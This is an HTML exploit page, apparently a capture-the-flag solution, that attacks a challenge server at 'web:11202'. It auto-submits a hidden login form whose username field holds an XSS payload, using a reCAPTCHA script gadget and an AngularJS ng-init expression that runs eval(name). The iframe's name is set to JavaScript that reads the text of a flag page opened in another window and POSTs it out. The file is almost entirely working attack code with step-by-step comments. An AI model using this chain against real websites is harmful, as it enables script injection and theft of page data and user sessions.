<!DOCTYPE html>
<html>
<head>
    <title>Exploit - Single Tab (Iframe)</title>
</head>
<body>
    <h1>Exploit Running (Single Tab Mode)...</h1>
    <br>

    <!-- The iframe is crucial - we set its name to the payload -->
    <iframe id="attackFrame" style="width:500px; height:200px;"></iframe>

    <!-- Login form that will submit to the iframe -->
    <form id="loginForm" action="http://web:11202/login" method="POST">
        <input type="hidden" name="username" value='<script src=https://www.google.com/recaptcha/about/js/main.min.js></script><d ng-init=[].pop.constructor("eval(name)")()>{request.session[user]}'>
        <input type="hidden" name="password" value="testtest">
    </form>

    <script>
        // Step 1: Open the flag page in a named window
        // This creates a window named "fuck" that we can access later
        var w = window.open("http://web:11202/flag", "fuck");

        // Step 2: Set the payload code
        // This will be set as the iframe's name, and eval(name) will execute it
        var payloadCode = "fetch('/api/flag/', {method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'content=' + encodeURIComponent(open('', 'fuck').document.body.innerText)})";

        // Step 3: Get references to iframe and form
        var frame = document.getElementById('attackFrame');
        var form = document.getElementById('loginForm');

        // Step 4: Set iframe's name to the payload
        // When XSS executes eval(name), it will evaluate the iframe's name property!
        frame.name = payloadCode;

        // Step 5: Set form target to the iframe's name
        // This makes the form submit INTO the iframe, so XSS executes in iframe context
        form.target = payloadCode;

        // Step 6: Submit the form after a short delay
        // The form submits to the iframe, login happens in iframe, XSS executes in iframe
        setTimeout(function() {
            form.submit();
        }, 500);
    </script>
</body>
</html>

